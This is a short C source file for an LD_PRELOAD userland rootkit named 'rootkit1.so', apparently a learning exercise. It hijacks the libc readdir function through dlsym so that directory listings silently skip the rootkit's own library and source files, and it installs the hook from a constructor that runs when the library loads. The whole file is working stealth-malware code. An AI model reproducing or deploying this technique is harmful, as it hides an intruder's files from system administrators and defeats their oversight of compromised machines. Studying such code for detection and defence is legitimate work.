#define _GNU_SOURCE

#include "urd00m_output.h"
#include <dlfcn.h>
#include <unistd.h>
#include <dirent.h>

#define RKITLIB  "rootkit1.so"
#define RKITSOURCE  "rkit1.c"

void* (*orig_malloc)(size_t) = 0;
struct dirent* (*orig_readdir)(DIR*) = 0;

// LS hijack of readdir
struct dirent* readdir(DIR* dirp) {
	INFO("My readdir hit\n");
	// get original output
	struct dirent* orig_read = orig_readdir(dirp);

	// modify original output to hide our rootkit
	struct dirent* our_read = orig_read;
	while(our_read!=NULL && (!strcmp(RKITLIB, our_read->d_name) || !strcmp(RKITSOURCE, our_read->d_name)) ) {
		our_read = orig_readdir(dirp);
	}

	return our_read;
}

// Sets up shims
int setup_shims(void) {
        #define SHIMIFY_ERR(x)  if ( !(orig_##x = dlsym(((void *) -1l), #x)) ) { \
                                fprintf(stdout, "Failed to setup SHIM for " #x "\n"); \
                                return -1; \
                        }
        SHIMIFY_ERR(malloc);
	SHIMIFY_ERR(readdir);
        return 0;
}

// constructor
static __attribute__((constructor)) void malloc_hijacker_init(void) {
        INFO("Init of rootkit1.so\n");
        if(setup_shims() == -1) {
                ERROR("shims setup failed\n");
        }
        INFO("Init succeeded\n");
}
